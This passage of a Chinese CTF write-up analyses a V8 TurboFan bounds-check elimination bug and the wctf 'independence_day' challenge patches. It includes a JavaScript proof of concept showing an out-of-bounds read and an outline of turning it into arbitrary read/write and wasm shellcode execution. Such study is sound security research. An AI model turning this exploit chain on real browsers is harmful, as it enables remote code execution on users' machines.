class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VisitCheckBounds</span><span class="params">(Node* node, SimplifiedLowering* lowering)</span> </span>&#123;</span><br><span class="line">    CheckParameters <span class="keyword">const</span>&amp; p = CheckParametersOf(node-&gt;op());</span><br><span class="line">    Type <span class="keyword">const</span> index_type = TypeOf(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    Type <span class="keyword">const</span> length_type = TypeOf(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (length_type.Is(Type::Unsigned31())) &#123;</span><br><span class="line">      <span class="keyword">if</span> (index_type.Is(Type::Integral32OrMinusZero())) &#123;</span><br><span class="line">        <span class="comment">// Map -0 to 0, and the values in the [-2^31,-1] range to the</span></span><br><span class="line">        <span class="comment">// [2^31,2^32-1] range, which will be considered out-of-bounds</span></span><br><span class="line">        <span class="comment">// as well, because the &#123;length_type&#125; is limited to Unsigned31.</span></span><br><span class="line">        VisitBinop(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                   MachineRepresentation::kWord32);</span><br><span class="line">        <span class="keyword">if</span> (lower()) &#123;</span><br><span class="line">          CheckBoundsParameters::Mode mode =</span><br><span class="line">              CheckBoundsParameters::kDeoptOnOutOfBounds;</span><br><span class="line">          <span class="keyword">if</span> (lowering-&gt;poisoning_level_ ==</span><br><span class="line">                  PoisoningMitigationLevel::kDontPoison &amp;&amp;</span><br><span class="line">              (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">               (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">                index_type.Max() &lt; length_type.Min()))) &#123;</span><br><span class="line">            <span class="comment">// The bounds check is redundant if we already know that</span></span><br><span class="line">            <span class="comment">// the index is within the bounds of [0.0, length[.</span></span><br><span class="line">            mode = CheckBoundsParameters::kAbortOnOutOfBounds;</span><br><span class="line">          &#125;</span><br><span class="line">          NodeProperties::ChangeOp(</span><br><span class="line">              node, simplified()-&gt;CheckedUint32Bounds(p.feedback(), mode));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-104415.png" alt=""><br>然后在Effect linearization中被Lower成Uint32LessThan。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Node* <span class="title">EffectControlLinearizer::LowerCheckedUint32Bounds</span><span class="params">(Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                        Node* frame_state)</span> </span>&#123;</span><br><span class="line">  Node* index = node-&gt;InputAt(<span class="number">0</span>);</span><br><span class="line">  Node* limit = node-&gt;InputAt(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">const</span> CheckBoundsParameters&amp; params = CheckBoundsParametersOf(node-&gt;op());</span><br><span class="line"></span><br><span class="line">  Node* check = __ Uint32LessThan(index, limit);</span><br><span class="line">  <span class="keyword">switch</span> (params.mode()) &#123;</span><br><span class="line">    <span class="keyword">case</span> CheckBoundsParameters::kDeoptOnOutOfBounds:</span><br><span class="line">      <span class="function">__ <span class="title">DeoptimizeIfNot</span><span class="params">(DeoptimizeReason::kOutOfBounds,</span></span></span><br><span class="line"><span class="function"><span class="params">                         params.check_parameters().feedback(), check,</span></span></span><br><span class="line"><span class="function"><span class="params">                         frame_state, IsSafetyCheck::kCriticalSafetyCheck)</span></span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> CheckBoundsParameters::kAbortOnOutOfBounds: &#123;</span><br><span class="line">      <span class="keyword">auto</span> if_abort = __ MakeDeferredLabel();</span><br><span class="line">      <span class="keyword">auto</span> done = __ MakeLabel();</span><br><span class="line"></span><br><span class="line">      <span class="function">__ <span class="title">Branch</span><span class="params">(check, &amp;done, &amp;if_abort)</span></span>;</span><br><span class="line"></span><br><span class="line">      <span class="function">__ <span class="title">Bind</span><span class="params">(&amp;if_abort)</span></span>;</span><br><span class="line">      <span class="function">__ <span class="title">Unreachable</span><span class="params">()</span></span>;</span><br><span class="line">      <span class="function">__ <span class="title">Goto</span><span class="params">(&amp;done)</span></span>;</span><br><span class="line"></span><br><span class="line">      <span class="function">__ <span class="title">Bind</span><span class="params">(&amp;done)</span></span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-112448.png" alt=""></p><h4 id="case-2"><a href="#case-2" class="headerlink" title="case 2"></a>case 2</h4><p>那么是不是把idx直接改成4，就可以越界读写一个element呢？<br>事实上没那么简单，它们生成的IR完全不一样。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line">    let idx = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">    main();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>typer phase<br>我们得到的IR是这样的。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-113657.png" alt=""><br>代码在<code>JSNativeContextSpecialization::BuildElementAccess</code>里<br>首先判断是否是<code>load_mode=LOAD_IGNORE_OUT_OF_BOUNDS</code><br>比较简单的一种情况就是array的index超出了array的length。<br>这样我们需要对index进行check，看是否超出了Smi::kMaxValue，引入了上面的CheckBounds节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check if we might need to grow the &#123;elements&#125; backing store.</span></span><br><span class="line"><span class="keyword">if</span> (keyed_mode.IsStore() &amp;&amp; IsGrowStoreMode(keyed_mode.store_mode())) &#123;</span><br><span class="line">  <span class="comment">// For growing stores we validate the &#123;index&#125; below.</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyed_mode.IsLoad() &amp;&amp;</span><br><span class="line">           keyed_mode.load_mode() == LOAD_IGNORE_OUT_OF_BOUNDS &amp;&amp;</span><br><span class="line">           CanTreatHoleAsUndefined(receiver_maps)) &#123;</span><br><span class="line">  <span class="comment">// Check that the &#123;index&#125; is a valid array index, we do the actual</span></span><br><span class="line">  <span class="comment">// bounds check below and just skip the store below if it's out of</span></span><br><span class="line">  <span class="comment">// bounds for the &#123;receiver&#125;.</span></span><br><span class="line">  index = effect = graph()-&gt;NewNode(</span><br><span class="line">      simplified()-&gt;CheckBounds(VectorSlotPair()), index,</span><br><span class="line">      jsgraph()-&gt;Constant(Smi::kMaxValue), effect, control);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// Check that the &#123;index&#125; is in the valid range for the &#123;receiver&#125;.</span></span><br><span class="line">  index = effect =</span><br><span class="line">      graph()-&gt;NewNode(simplified()-&gt;CheckBounds(VectorSlotPair()), index,</span><br><span class="line">                       length, effect, control);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后还需要对index进行实际的check，也就是比较index是否小于array length，引入了一个NumberLessThan节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check if we can return undefined for out-of-bounds loads.</span></span><br><span class="line">      <span class="keyword">if</span> (keyed_mode.load_mode() == LOAD_IGNORE_OUT_OF_BOUNDS &amp;&amp;</span><br><span class="line">          CanTreatHoleAsUndefined(receiver_maps)) &#123;</span><br><span class="line">        Node* check =</span><br><span class="line">            graph()-&gt;NewNode(simplified()-&gt;NumberLessThan(), index, length);</span><br><span class="line">        Node* branch = graph()-&gt;NewNode(</span><br><span class="line">            common()-&gt;Branch(BranchHint::kTrue,</span><br><span class="line">                             IsSafetyCheck::kCriticalSafetyCheck),</span><br><span class="line">            check, control);</span><br><span class="line"></span><br><span class="line">        Node* if_true = graph()-&gt;NewNode(common()-&gt;IfTrue(), branch);</span><br><span class="line">        Node* etrue = effect;</span><br><span class="line">        Node* vtrue;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// Perform the actual load</span></span><br><span class="line">          vtrue = etrue =</span><br><span class="line">              graph()-&gt;NewNode(simplified()-&gt;LoadElement(element_access),</span><br><span class="line">                               elements, index, etrue, if_true);</span><br></pre></td></tr></table></figure><p>然后这个节点在LoadElimination进行TyperNarrowingReducer的时候。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line">  <span class="keyword">case</span> IrOpcode::kNumberLessThan: &#123;</span><br><span class="line">    <span class="comment">// TODO(turbofan) Reuse the logic from typer.cc (by integrating relational</span></span><br><span class="line">    <span class="comment">// comparisons with the operation typer).</span></span><br><span class="line">    Type left_type = NodeProperties::GetType(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    Type right_type = NodeProperties::GetType(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (left_type.Is(Type::PlainNumber()) &amp;&amp;</span><br><span class="line">        right_type.Is(Type::PlainNumber())) &#123;</span><br><span class="line">      <span class="keyword">if</span> (left_type.Max() &lt; right_type.Min()) &#123;</span><br><span class="line">        new_type = op_typer_.singleton_true();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (left_type.Min() &gt;= right_type.Max()) &#123;</span><br><span class="line">        new_type = op_typer_.singleton_false();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>由于left_type即index的type信息被分析为(4,4)，right_type即array length的type信息被分析为（4,4)<br>满足<code>else if (left_type.Min() &gt;= right_type.Max())</code><br>所以kNumberLessThan的类型会被更新成false，然后在ConstantFoldingReducer时候</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">ConstantFoldingReducer::Reduce</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  DisallowHeapAccess no_heap_access;</span><br><span class="line">  <span class="comment">// Check if the output type is a singleton.  In that case we already know the</span></span><br><span class="line">  <span class="comment">// result value and can simply replace the node if it's eliminable.</span></span><br><span class="line">  <span class="keyword">if</span> (!NodeProperties::IsConstant(node) &amp;&amp; NodeProperties::IsTyped(node) &amp;&amp;</span><br><span class="line">      node-&gt;op()-&gt;HasProperty(Operator::kEliminatable)) &#123;</span><br><span class="line">    <span class="comment">// TODO(v8:5303): We must not eliminate FinishRegion here. This special</span></span><br><span class="line">    <span class="comment">// case can be removed once we have separate operators for value and</span></span><br><span class="line">    <span class="comment">// effect regions.</span></span><br><span class="line">    <span class="keyword">if</span> (node-&gt;opcode() == IrOpcode::kFinishRegion) <span class="keyword">return</span> NoChange();</span><br><span class="line">    <span class="comment">// We can only constant-fold nodes here, that are known to not cause any</span></span><br><span class="line">    <span class="comment">// side-effect, may it be a JavaScript observable side-effect or a possible</span></span><br><span class="line">    <span class="comment">// eager deoptimization exit (i.e. &#123;node&#125; has an operator that doesn't have</span></span><br><span class="line">    <span class="comment">// the Operator::kNoDeopt property).</span></span><br><span class="line">    Type upper = NodeProperties::GetType(node);</span><br><span class="line">    <span class="keyword">if</span> (!upper.IsNone()) &#123;</span><br><span class="line">      Node* replacement = <span class="literal">nullptr</span>;</span><br><span class="line">      <span class="keyword">if</span> (upper.IsHeapConstant()) &#123;</span><br><span class="line">        replacement = jsgraph()-&gt;Constant(upper.AsHeapConstant()-&gt;Ref());</span><br></pre></td></tr></table></figure><p>被直接折叠成了false节点。<br>最后只剩下了对Smi::kMaxValue的CheckBounds。<br>然而这对我们来说毫无意义。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-115435.png" alt=""><br>所以我们的第一步就是构造PoC，bypass掉ConstantFoldingReducer，这一步其实非常简单，只要让NumberLessThan在TyperNarrowingReducer的时候，不被类型更新成false就可以了。</p><h4 id="case3"><a href="#case3" class="headerlink" title="case3"></a>case3</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line">    let idx = <span class="number">4</span>;</span><br><span class="line">    idx = idx &amp; <span class="number">0xffff</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">    main();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-121438.png" alt=""><br>idx的range取决于20和16号节点，如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#21:SpeculativeNumberBitwiseAnd[SignedSmall](#16:NumberConstant, #20:NumberConstant, #17:Checkpoint, #12:JSStackCheck)  [Type: Range(0, 4)]</span><br><span class="line">#20:NumberConstant[65535]()  [Type: Range(65535, 65535)]</span><br><span class="line">#16:NumberConstant[4]()  [Type: Range(4, 4)]</span><br></pre></td></tr></table></figure><p>经过以下的typer分析得到range为(0,4)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">SPECULATIVE_NUMBER_BINOP(NumberBitwiseAnd)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPECULATIVE_NUMBER_BINOP(Name)                         \</span></span><br><span class="line">  Type OperationTyper::Speculative##Name(Type lhs, Type rhs) &#123; \</span><br><span class="line">    lhs = SpeculativeToNumber(lhs);                            \</span><br><span class="line">    rhs = SpeculativeToNumber(rhs);                            \</span><br><span class="line">    <span class="keyword">return</span> Name(lhs, rhs);                                     \</span><br><span class="line">  &#125;</span><br><span class="line">---&gt;</span><br><span class="line"><span class="function">Type <span class="title">OperationTyper::NumberBitwiseAnd</span><span class="params">(Type lhs, Type rhs)</span> </span>&#123;</span><br><span class="line">  DCHECK(lhs.Is(Type::Number()));</span><br><span class="line">  DCHECK(rhs.Is(Type::Number()));</span><br><span class="line"></span><br><span class="line">  lhs = NumberToInt32(lhs);</span><br><span class="line">  rhs = NumberToInt32(rhs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lhs.IsNone() || rhs.IsNone()) <span class="keyword">return</span> Type::None();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">double</span> lmin = lhs.Min();</span><br><span class="line">  <span class="keyword">double</span> rmin = rhs.Min();</span><br><span class="line">  <span class="keyword">double</span> lmax = lhs.Max();</span><br><span class="line">  <span class="keyword">double</span> rmax = rhs.Max();</span><br><span class="line">  <span class="keyword">double</span> <span class="built_in">min</span> = kMinInt;</span><br><span class="line">  <span class="comment">// And-ing any two values results in a value no larger than their maximum.</span></span><br><span class="line">  <span class="comment">// Even no larger than their minimum if both values are non-negative.</span></span><br><span class="line">  <span class="keyword">double</span> <span class="built_in">max</span> =</span><br><span class="line">      lmin &gt;= <span class="number">0</span> &amp;&amp; rmin &gt;= <span class="number">0</span> ? <span class="built_in">std</span>::<span class="built_in">min</span>(lmax, rmax) : <span class="built_in">std</span>::<span class="built_in">max</span>(lmax, rmax);</span><br><span class="line">  <span class="comment">// And-ing with a non-negative value x causes the result to be between</span></span><br><span class="line">  <span class="comment">// zero and x.</span></span><br><span class="line">  <span class="keyword">if</span> (lmin &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">max</span> = <span class="built_in">std</span>::<span class="built_in">min</span>(<span class="built_in">max</span>, lmax);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (rmin &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">max</span> = <span class="built_in">std</span>::<span class="built_in">min</span>(<span class="built_in">max</span>, rmax);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Type::Range(<span class="built_in">min</span>, <span class="built_in">max</span>, zone());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后checkbounds的range也被分析成(0,4)<br>即取index和length的range的交集。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Type <span class="title">OperationTyper::CheckBounds</span><span class="params">(Type index, Type length)</span> </span>&#123;</span><br><span class="line">  DCHECK(length.Is(cache_-&gt;kPositiveSafeInteger));</span><br><span class="line">  <span class="keyword">if</span> (length.Is(cache_-&gt;kSingletonZero)) <span class="keyword">return</span> Type::None();</span><br><span class="line">  Type mask = Type::Range(<span class="number">0.0</span>, length.Max() - <span class="number">1</span>, zone());</span><br><span class="line">  <span class="keyword">if</span> (index.Maybe(Type::MinusZero())) &#123;</span><br><span class="line">    index = Type::Union(index, cache_-&gt;kSingletonZero, zone());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Type::Intersect(index, mask, zone());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">#<span class="number">35</span>:CheckBounds[VectorSlotPair(INVALID)](#<span class="number">21</span>:SpeculativeNumberBitwiseAnd, #<span class="number">34</span>:NumberConstant, #<span class="number">33</span>:LoadField, #<span class="number">12</span>:JSStackCheck)  [Type: Range(<span class="number">0</span>, <span class="number">4</span>)]</span><br></pre></td></tr></table></figure><p>于是NumberLessThan的left_type即CheckBounds(实际上当成index也可以理解)的范围不再是(4,4)，而是被分析成了(0,4)<br>不再满足<code>left_type.Min() &gt;= right_type.Max())</code><br>也就不会被折叠了。<br>于是最终的PoC就可以给出</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line">    <span class="keyword">let</span> idx = <span class="number">4</span>;</span><br><span class="line">    idx = idx &amp; <span class="number">0xffff</span>;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(main());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">sakura@sakuradeMacBook-Pro:~<span class="regexp">/Desktop/</span>v8/v8/out/gn$ ./d8 poc.js</span><br><span class="line"><span class="number">-1.1885946300594787e+148</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>有了越界读写一个element的原语,接下来就是构建完整的漏洞利用。<br>思路是：<br>首先分配两个array，一个double array，一个object array<br>然后通过覆盖object array的map为double map，就可以将其中的用户空间对象leak出来。<br>然后在array的elments去fake一个arraybuffer。<br>然后通过将double array的map覆盖成object array，就可以将fake好的arraybuffer给当成object给取出来。<br>而这个fake的arraybuffer的内容是我们可控的，于是就可以任意地址读写了。<br>接下来就是找到wasm_func里rwx的地址，将shellcode写入执行即可。<br>详细的思路参考我写的<a href="http://eternalsakura13.com/2019/04/29/*ctf_oob/">*ctf 2019 OOB</a> exp。</p><h2 id="wctf-independence-day"><a href="#wctf-independence-day" class="headerlink" title="wctf independence_day"></a>wctf independence_day</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/objects/code.cc b/src/objects/code.cc</span><br><span class="line">index <span class="number">24817</span>ca65c.<span class="number">.4079</span>f6077d <span class="number">100644</span></span><br><span class="line">--- a/src/objects/code.cc</span><br><span class="line">+++ b/src/objects/code.cc</span><br><span class="line">@@ <span class="number">-925</span>,<span class="number">6</span> +<span class="number">925</span>,<span class="number">7</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">DependentCode::InstallDependency</span><span class="params">(Isolate* isolate,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">const</span> MaybeObjectHandle&amp; code,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       Handle&lt;HeapObject&gt; object,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       DependencyGroup group)</span> </span>&#123;</span><br><span class="line">+<span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">   <span class="function">Handle&lt;DependentCode&gt; <span class="title">old_deps</span><span class="params">(DependentCode::GetDependentCode(object),</span></span></span><br><span class="line"><span class="function"><span class="params">                                  isolate)</span></span>;</span><br><span class="line">   Handle&lt;DependentCode&gt; new_deps =</span><br><span class="line">@@ <span class="number">-932</span>,<span class="number">6</span> +<span class="number">933</span>,<span class="number">7</span> @@ <span class="keyword">void</span> DependentCode::InstallDependency(Isolate* isolate,</span><br><span class="line">   <span class="comment">// Update the list head if necessary.</span></span><br><span class="line">   <span class="keyword">if</span> (!new_deps.is_identical_to(old_deps))</span><br><span class="line">     DependentCode::SetDependentCode(object, new_deps);</span><br><span class="line">+#endif</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> Handle&lt;DependentCode&gt; DependentCode::InsertWeakCode(</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">commit <span class="number">3794e5</span>f0eeee3d421cc0d2a8d8b84ac82d37f10d</span><br><span class="line">Author: Your Name &lt;you@example.com&gt;</span><br><span class="line">Date:   Sat Dec <span class="number">15</span> <span class="number">18</span>:<span class="number">21</span>:<span class="number">08</span> <span class="number">2018</span> +<span class="number">0100</span></span><br><span class="line"></span><br><span class="line">    strip global in realms</span><br><span class="line"></span><br><span class="line">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span><br><span class="line">index <span class="number">98b</span>c56ad25..e72f528ae5 <span class="number">100644</span></span><br><span class="line">--- a/src/d8/d8.cc</span><br><span class="line">+++ b/src/d8/d8.cc</span><br><span class="line">@@ <span class="number">-1043</span>,<span class="number">9</span> +<span class="number">1043</span>,<span class="number">8</span> @@ <span class="function">MaybeLocal&lt;Context&gt; <span class="title">Shell::CreateRealm</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">     &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">delete</span>[] old_realms;</span></span></span><br><span class="line"><span class="function"><span class="params">   &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">-  Local&lt;ObjectTemplate&gt; global_template = CreateGlobalTemplate(isolate);</span></span></span><br><span class="line"><span class="function"><span class="params">   Local&lt;Context&gt; context =</span></span></span><br><span class="line"><span class="function"><span class="params">-      Context::New(isolate, <span class="literal">nullptr</span>, global_template, global_object);</span></span></span><br><span class="line"><span class="function"><span class="params">+      Context::New(isolate, <span class="literal">nullptr</span>, ObjectTemplate::New(isolate), v8::MaybeLocal&lt;Value&gt;());</span></span></span><br><span class="line"><span class="function"><span class="params">   DCHECK(!try_catch.HasCaught());</span></span></span><br><span class="line"><span class="function"><span class="params">   <span class="keyword">if</span> (context.IsEmpty()) <span class="keyword">return</span> MaybeLocal&lt;Context&gt;();</span></span></span><br><span class="line"><span class="function"><span class="params">   InitializeModuleEmbedderData(context);</span></span></span><br></pre></td></tr></table></figure><p>题目给了两个patch，第一个patch是禁用了code dependencies，第二个patch应该是禁用了wasm这种利用方法。<br>要理解这个patch，就要知道v8中不止有<br>实际上注册对arr的type的dependencies的地方在ReduceElementAccess的BuildCheckMaps中，换句话说，如果我们要check的map是stableMap，就直接注册一个 compilation dependencies的回调到map中。<br>如果不是，就插入一个checkMap节点到effect chain中。<br>可以学习一下<a 